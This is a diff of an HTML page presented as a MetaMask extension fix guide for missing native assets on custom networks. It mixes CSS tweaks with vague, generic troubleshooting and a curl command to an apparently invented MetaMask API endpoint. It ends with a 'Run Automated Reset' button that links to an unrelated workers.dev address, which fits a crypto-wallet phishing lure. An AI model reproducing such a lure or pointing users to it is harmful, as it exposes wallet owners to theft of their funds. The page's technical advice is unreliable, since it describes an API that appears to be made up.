@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Assets Native Assets For Custom Networks – Fix Guide</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #121214;
+        font-family: BlinkMacSystemFont;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #00adb5; }
     .btn {
-        background: #00adb5;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,35 +42,32 @@
 <h1>Metamask Extension Bug Assets Native Assets For Custom Networks</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users are unable to view native assets for custom networks when selecting them in the Metamask extension, resulting in an incomplete list of available assets.</li>
+<li>Users are unable to view native assets for custom networks when selected in the Metamask extension, resulting in incomplete asset displays.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The issue arises from a bug in the Metamask extension that fails to properly fetch and display native assets for custom networks, likely due to incorrect configuration or insufficient data.</li>
+<li>The issue arises from a bug in the Metamask extension's asset handling mechanism for custom networks, where it fails to fetch or display the native assets correctly.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can attempt the following manual overrides:</li>
-<li>Update the Metamask extension to the latest version to ensure any bug fixes are applied.</li>
-<li>Manually add the native asset for the custom network by using the following JSON configuration:</li>
+<li>To troubleshoot, try the following steps:</li>
+<li>Check the custom network configuration to ensure it includes the native asset details.</li>
+<li>Manually add the native asset using the Metamask API, utilizing a command similar to the one below:
+  <code>bash
+  curl -X POST \
+  https://example.metamask.io/api/v1/assets \
+  -H 'Content-Type: application/json' \
+  -d '{"asset": "Native Asset", "network": "Custom Network"}'</code></li>
+<li>Verify that the Metamask extension is updated to the latest version, as updates often include bug fixes for such issues.
+For more complex scenarios, consider utilizing an external console for deeper inspection and debugging.</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Custom Network Native Asset&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;symbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;CNNA&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;decimals&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">18</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...custom network native asset address...&quot;</span>
-<span class="p">}</span>
-</code></pre></div>
-
+<h2>Prerequisites</h2>
 <ul>
-<li>Utilize the Ethereum network's RPC endpoint to fetch the native asset information and update the Metamask configuration accordingly.</li>
+<li>Metamask extension installed and configured</li>
+<li>Custom network added to the Metamask extension</li>
+<li>Basic understanding of Metamask API and asset management</li>
 </ul>
-<p>Prerequisites:
-* Metamask extension installed and configured
-* Custom network added to the Metamask extension
-* Basic understanding of Ethereum network and asset configuration</p>
-<p>Consider utilizing an external console to execute commands and update configurations for more complex custom network setups.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-miss-match-between-network-picker.html">Metamask Extension Bug Assets Miss Match Between Network Picker</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
